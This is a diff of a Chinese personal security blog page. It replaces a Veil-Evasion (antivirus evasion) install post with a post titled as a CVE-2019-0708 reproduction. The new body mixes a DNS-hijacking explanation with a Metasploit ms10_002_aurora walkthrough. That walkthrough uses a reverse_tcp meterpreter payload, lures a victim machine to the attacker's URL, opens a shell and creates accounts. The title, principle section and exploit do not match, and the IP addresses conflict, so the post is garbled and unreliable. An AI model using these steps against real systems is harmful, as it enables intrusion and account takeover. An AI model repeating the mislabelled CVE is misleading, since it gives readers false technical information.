@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Veil-Evasion | 王亮亮</title>
-  <meta name="keywords" content=" 免杀 ">
-  <meta name="description" content="Veil-Evasion | 王亮亮">
+  <title>cve-2019-0708漏洞复现 | 王亮亮</title>
+  <meta name="keywords" content=" 渗透 ">
+  <meta name="description" content="cve-2019-0708漏洞复现 | 王亮亮">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简介 王亮亮 毕业于广州工业，目前工作信息安全方向。 喜欢研究，渗透，网络，系统，编程新技术和未来发展。 最近 在出版完整渗透测试过程教学，请大家多多支持。 联系方式 QQ：1119098304邮箱：1119098304@qq.com">
 <meta property="og:type" content="website">
@@ -487,9 +487,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-Veil" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-DNS劫持" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Veil-Evasion</h1>
+        <h1 class="article-title">cve-2019-0708漏洞复现</h1>
     
     <div class="article-meta">
         
@@ -497,21 +497,21 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="工具">工具</a>
+                <a href="javascript:" data-rel="kali">kali</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">免杀</a>
+            <a href="javascript:" class="color3">渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-08-31 22:21:54'>2019-08-30 10:29</time>
+        创建时间:<time class="date" title='更新时间: 2019-09-23 17:28:45'>2019-09-23 20:29</time>
         
     </div>
     <div class="article-meta">
@@ -533,7 +533,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#工具渗透"><span class="toc-text">工具渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#失败提示"><span class="toc-text">失败提示</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#利用原理"><span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#配置网络地址"><span class="toc-text">配置网络地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#开启工具"><span class="toc-text">开启工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查找10-002漏洞模块"><span class="toc-text">查找10-002漏洞模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#测试"><span class="toc-text">测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#成功提权"><span class="toc-text">成功提权</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -548,8 +548,12 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="工具渗透"><a href="#工具渗透" class="headerlink" title="工具渗透"></a>工具渗透</h1><p>安装之前先更新一下包，执行命令apt-get update<br>下载配置Veil所需的包，不然会报错，在终端输入：<br>apt-get install libncurses5*<br>apt-get install libavutil55*<br>apt-get install gcc-mingw-w64*<br>apt-get install wine32</p>
-<h1 id="失败提示"><a href="#失败提示" class="headerlink" title="失败提示"></a>失败提示</h1><p>如果下载失败就挂个代理，应该没什么问题。<br>这里要说的是红酒瓶wine，如果安装失败就使用如下三条命令：dpkg –add-architecture i386 apt-get update apt-get install wine32<br>Veil-Evasion下载，安装<br>apt-get install Veil-Evasion<br>下载完成后进行安装<br>Veil<br>运行Veil</p>
+        <h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>访问一个网站，输入域名，正常DNS服务器返回该域名的IP，而DNS劫持后，会返回一个运营商额中间服务器IP，该访问服务器会一致性的返回302，让用户浏览器跳转到预处理好的带广告的网页，在该网页中再通过iframe打开用户原来访问的地址</p>
+<h1 id="配置网络地址"><a href="#配置网络地址" class="headerlink" title="配置网络地址"></a>配置网络地址</h1><p>ifconfig eth0 192.168.56.133/24 (临时生效，重启生效)</p>
+<h1 id="开启工具"><a href="#开启工具" class="headerlink" title="开启工具"></a>开启工具</h1><p>msfconsole</p>
+<h1 id="查找10-002漏洞模块"><a href="#查找10-002漏洞模块" class="headerlink" title="查找10-002漏洞模块"></a>查找10-002漏洞模块</h1><p>search 10-002<br>use exploit/windows/browser/ms10_002_aurora 进行漏洞攻击<br>set payload windows/meterpreter/reverse_tcp 定义攻击载荷<br>set lhost 192.168.48.123 定义本机地址<br>set URIPATH / 定义url的后缀（这里我只设置了一个/）<br>exploit 开发</p>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>在肉鸡上打开目标网站<a href="http://192.168.56.133:8080/" target="_blank" rel="noopener">http://192.168.56.133:8080/</a></p>
+<h1 id="成功提权"><a href="#成功提权" class="headerlink" title="成功提权"></a>成功提权</h1><p>sessions -i 1 打开连接会话<br>session 查看已经成功获取的会话，使用session -i 连接到指定序号的meterpreter会话已继续利用<br>通过shell 获取目标主机的远程命令行<br>通过DOS创建账号与密码</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1119098304@qq.com </span>
@@ -563,12 +567,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>Veil-Evasion</p>
+    <p><span class="copy-title">文章标题:</span>cve-2019-0708漏洞复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="WLiangliang">WLiangliang</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-30, 10:29:32</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-31, 22:21:54</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/08/30/Veil/" title="Veil-Evasion">http://yoursite.com/2019/08/30/Veil/</a>
+    <p><span class="copy-title">发布时间:</span>2019-09-23, 20:29:32</p>
+    <p><span class="copy-title">最后更新:</span>2019-09-23, 17:28:45</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/09/23/DNS劫持/" title="cve-2019-0708漏洞复现">http://yoursite.com/2019/09/23/DNS劫持/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
